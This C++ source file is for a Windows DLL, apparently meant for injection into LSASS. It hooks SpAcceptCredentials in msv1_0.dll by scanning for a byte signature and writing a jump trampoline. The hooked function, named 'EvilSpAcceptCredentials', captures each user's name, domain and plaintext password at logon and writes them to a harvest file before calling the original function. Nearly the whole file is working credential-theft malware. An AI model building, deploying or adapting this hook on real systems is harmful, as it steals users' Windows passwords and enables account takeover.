#define SECURITY_WIN32
#include <Sspi.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include<stdio.h>
#include<stdlib.h>
#include <Windows.h>
//Constants
#define ACCEPT_CREDENTIALS_SIGNATURE  { 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48 }
#define ACCEPT_CREDENTIALS_SIGNATURE_SIZE 13
#define ASSEMBLY_TRAMPOLINE  { 0x48, 0xb8 }
#define GLOBAL_BUFFER 50
#define FIRST_BYTES_COUNT 12
#define CREDENTIALS_HARVEST_FILENAME "C:\\Users\\DeskTop\\DigitalWhisper\\Credentials.txt"

//Globals

//Initializing constants
char SpAcceptCredentialsMemorySignature[GLOBAL_BUFFER] = ACCEPT_CREDENTIALS_SIGNATURE;
char Trampoline[FIRST_BYTES_COUNT] = ASSEMBLY_TRAMPOLINE;


void UnHookAcceptCredentials();
//Global Pointers
//The address where the pattern is starting
void* AcceptCredentialsSignaturePointer = NULL;
void* SpAcceptCredentialsAddressPointer = NULL;
char OrignalSpAcceptCredentialsContainer[FIRST_BYTES_COUNT] = { NULL };
//Pointer to the function
using PtrSpAcceptCredentials = NTSTATUS(NTAPI*)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);

//Costum pointer to the original function
void* MemoryScannerForSpAcceptCredentials()
{
	//Getting the size of the image
	HMODULE Msv = LoadLibraryA("msv1_0.dll");
	DWORD_PTR MsvAddress = (DWORD_PTR)Msv;
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Msv;
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(MsvAddress + DosHeader->e_lfanew);
	ULONG_PTR SizeOfImage = NtHeader->OptionalHeader.SizeOfImage;
	char* ModuleStart = (char*)Msv;
	//Scanning from ModuleStart to ModuleStart+SizeOfImage
	int SignatureIndex = 0;


	for (UINT i = 0; i < SizeOfImage; i++)
	{
		if (SpAcceptCredentialsMemorySignature[SignatureIndex] == ModuleStart[i])
		{
			int Current = i;
			while (Current<SizeOfImage&&ModuleStart[i] == SpAcceptCredentialsMemorySignature[SignatureIndex])
			{
				if (SignatureIndex == ACCEPT_CREDENTIALS_SIGNATURE_SIZE-1)
				{
					char Text[GLOBAL_BUFFER];
					sprintf(Text, "%s %d", "Address found at:", (void*)(&ModuleStart[Current]));
					MessageBoxA(0, Text, "Success!", NULL);
					return (void*)(&ModuleStart[Current]);
				}
				Current++;
				SignatureIndex++;
			}
			SignatureIndex = 0;
			i++;

		}

	}

	//MsgBox about the error
	MessageBoxA(0, "SpAcceptCredentials Not found!", "Error!", NULL);
	exit(1);
	return (void*)0;
}




//The malicious function to be called instead of the original SpAcceptCredentials
NTSTATUS NTAPI EvilSpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{

	
	//Writing creds to a file and creating messageboxes
	HANDLE Harvest;
	Harvest= CreateFileA(CREDENTIALS_HARVEST_FILENAME
		, GENERIC_ALL, 0, NULL, 2, NULL, NULL);

	MessageBoxW(0, (wchar_t*)PrimaryCredentials->DownlevelName.Buffer, L"UserName", NULL);
	WriteFile(Harvest, PrimaryCredentials->DownlevelName.Buffer, PrimaryCredentials->DownlevelName.Length, NULL, NULL);

	MessageBoxW(0, (wchar_t*)PrimaryCredentials->DomainName.Buffer, L"DomainName", NULL);
	WriteFile(Harvest, PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length,NULL, NULL);
	
	MessageBoxW(0, (wchar_t*)PrimaryCredentials->Password.Buffer, L"Password", NULL);
	WriteFile(Harvest, PrimaryCredentials->Password.Buffer, PrimaryCredentials->Password.Length,NULL, NULL);
	
	CloseHandle(Harvest);
	//UnHooking the rouge function
	UnHookSpAcceptCredentials();
	PtrSpAcceptCredentials OriginalSpAcceptCredentialsAddress = (PtrSpAcceptCredentials)MemoryScannerForSpAcceptCredentials();

	//Fixing the stack by calling the original function
	return OriginalSpAcceptCredentialsAddress(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
}
//The function tha unhooks the evil SpAcceptCredentials
void UnHookSpAcceptCredentials()
{
	HANDLE LsassProcess;
	LsassProcess = GetCurrentProcess();
	//Overriding the trampoline
	WriteProcessMemory(LsassProcess, SpAcceptCredentialsAddressPointer, OrignalSpAcceptCredentialsContainer, sizeof(OrignalSpAcceptCredentialsContainer), NULL);
}

void BuildTrampoline()
{
	//Saving the addres of our hooking function
	DWORD_PTR EvilSpAcceptCredentialsPointer = (unsigned long long)&EvilSpAcceptCredentials;
	//Creating the trampoline by adding the address of the function to the trampoline. then adding a jmp command to rax
	memcpy(Trampoline + 2 * sizeof(char)
		, &EvilSpAcceptCredentialsPointer
		, sizeof(&EvilSpAcceptCredentialsPointer));

	memcpy(Trampoline + 2 * sizeof(char) + sizeof(&EvilSpAcceptCredentialsPointer)
		, (void*)&"\xff\xe0",
		2 * sizeof(char));

}

//The function that preforms the hook
void HookSpAcceptCredentials()
{
	
	//The address of the start of the signature
	AcceptCredentialsSignaturePointer = MemoryScannerForSpAcceptCredentials();
	//The address where the function begin
	SpAcceptCredentialsAddressPointer = (void*)((DWORD_PTR)AcceptCredentialsSignaturePointer - 16);

	// Saving the original opcodes of the function in a global variable
	memcpy(OrignalSpAcceptCredentialsContainer, SpAcceptCredentialsAddressPointer,FIRST_BYTES_COUNT);
	//Building the global trampoline
	BuildTrampoline();
	//Writing the trampoline to memory
	WriteProcessMemory(GetCurrentProcess(),
		SpAcceptCredentialsAddressPointer,
		Trampoline,
		sizeof(Trampoline),
		NULL);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		HookSpAcceptCredentials();
	}
	case DLL_THREAD_ATTACH:
	{
		HookSpAcceptCredentials();
	}
		break;
	}
	return 1;
}